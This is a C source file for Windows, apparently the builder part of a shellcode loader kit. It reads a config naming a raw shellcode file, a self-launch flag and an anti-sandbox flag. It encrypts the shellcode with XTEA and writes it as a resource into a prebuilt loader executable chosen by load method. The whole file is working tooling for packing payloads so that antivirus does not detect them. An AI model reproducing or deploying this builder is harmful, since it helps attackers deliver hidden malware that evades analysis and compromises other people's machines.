#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "Loader.h"

char *FilePath;
char *shellcode;
HANDLE hPayload;

void init()
{
	printf("I am init\n");
}

int main(int argc, char **argv)
{
	struct
	{
		char *payload;
		bool selflaunch;
		bool antisandbox;
		char *LoadMethed;
	} config = {0};
	FILE *fp = fopen("config", "r");
	char buff[0x100] = {0};
	fgets(buff, 255, (FILE *)fp);
	config.payload = (char *)malloc(strlen(buff));
	if (!config.payload)
	{
		printf("config.payload Malloc error\n");
		return 1;
	}
	strcpy(config.payload, buff);
	for (int i = 0; i < strlen(config.payload); i++)
	{
		if (config.payload[i] == '\n' || config.payload[i] == '\r')
			config.payload[i] = 0;
	}

	fgets(buff, 255, (FILE *)fp);
	config.selflaunch = 1 & (*(char *)(strchr(buff, ':') + 1));
	fgets(buff, 255, (FILE *)fp);
	config.antisandbox = 1 & (*(char *)(strchr(buff, ':') + 1));
	fgets(buff, 255, (FILE *)fp);
	config.LoadMethed = (char *)malloc(strlen(buff));
	if (!config.LoadMethed)
	{
		printf("config.payload Malloc error\n");
		return 1;
	}
	strcpy(config.LoadMethed, buff);

	hPayload = CreateFileA(config.payload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error %d\n", GetLastError());
		return 1;
	}
	//init();

	size_t shellcodeSize = GetFileSize(hPayload, NULL);
	shellcode = (char *)malloc(shellcodeSize + 2);
	if (!shellcode)
	{
		printf("shellcode Malloc error\n");
		return 1;
	}
	memset(shellcode, 0, shellcodeSize + 2);
	shellcode[0] = config.selflaunch | (config.antisandbox << 1);
	DWORD lpNumberOfBytesRead;
	if (!ReadFile(hPayload, shellcode + 2, shellcodeSize, &lpNumberOfBytesRead, NULL))
	{
		printf("ReadFile error %d\n", GetLastError());
		return 1;
	}
	for (int i = 0; i < (shellcodeSize + 2) / 8; i++)
	{
		XteaEncrypt(32, (unsigned int *)(shellcode + 8 * i));
	}
	FilePath = (char *)malloc(strlen(config.LoadMethed) + 5);
	if (!FilePath)
	{
		printf("LoadMethed Malloc error\n");
		return 1;
	}
	sprintf(FilePath, "..\\bin\\%s.exe", config.LoadMethed);
	HANDLE hUpdateRes = BeginUpdateResourceA(FilePath, FALSE);
	if (hUpdateRes == NULL)
	{
		printf("BeginUpdateResourceA error %d\n", GetLastError());
		return 1;
	}
	if (!UpdateResourceA(hUpdateRes, RT_RCDATA, MAKEINTRESOURCE(SOURCEID), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), shellcode, shellcodeSize + 2))
	{
		printf("UpdateResourceA error %d\n", GetLastError());
		return 1;
	}
	EndUpdateResource(hUpdateRes, FALSE);
}